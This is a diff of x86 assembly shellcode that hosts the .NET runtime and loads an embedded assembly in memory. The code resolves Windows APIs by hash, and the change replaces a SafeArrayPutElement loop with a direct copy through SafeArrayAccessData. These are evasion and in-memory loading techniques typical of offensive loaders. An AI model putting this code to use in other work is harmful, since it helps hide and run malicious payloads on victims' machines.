@@ -76,29 +76,24 @@ __delta:                pop     ebp
                         call    eax
                         mov     [ebp+(pRawAssembly - __delta)], eax
                         
-                        push    0827606BEh                      ;SafeArrayPutElement
+                        push    09F266B8Eh                      ;SafeArrayAccessData
                         call    get_api_mshash
-                        mov     ebx, eax
                         
+                        lea     ecx, [ebp+(pbytes - __delta)]
+                        push    ecx
+                        push    [ebp+(pRawAssembly - __delta)]
+                        call    eax
+                        
+                        mov     edi, [ebp+(pbytes - __delta)]
                         lea     esi, [ebp+(dotnetbytes - __delta)]
-                        xor     ecx, ecx
-                        mov     [ebp+(index - __delta)], ecx
-                        mov     edi, dword ptr [ebp+(dotnetbytes_size - __delta)]
-                        lea     edi, [esi+edi]
-
-__fill_array:           
+                        mov     ecx, [ebp+(dotnetbytes_size - __delta)]
+                        cld
+                        rep     movsb
                         
-                        push    esi
-                        lea     eax, [ebp+(index - __delta)]
-                        push    eax
-                        push    dword ptr [ebp+(pRawAssembly - __delta)]
-                        call    ebx
-
-             
-                        inc     esi
-                        inc     dword ptr[ebp+(index - __delta)]
-                        cmp     esi, edi
-                        jnz     __fill_array
+                        push    0AB2BF222h                      ;SafeArrayUnaccessData
+                        call    get_api_mshash
+                        push    [ebp+(pRawAssembly - __delta)]
+                        call    eax
                         
                         mov     eax, [ebp+(pAppDomain - __delta)]
                         mov     ecx, [eax]
@@ -238,6 +233,7 @@ szmscoree               db      "mscoree.dll", 0
 szoleaut32              db      "oleaut32.dll", 0
 usnetver                dw      'v', '4', '.', '0', '.', '3', '0', '3', '1', '9', 0
 pRawAssembly            dd      ?
+pbytes                  dd      ?
 
 
 index                   dd      ?
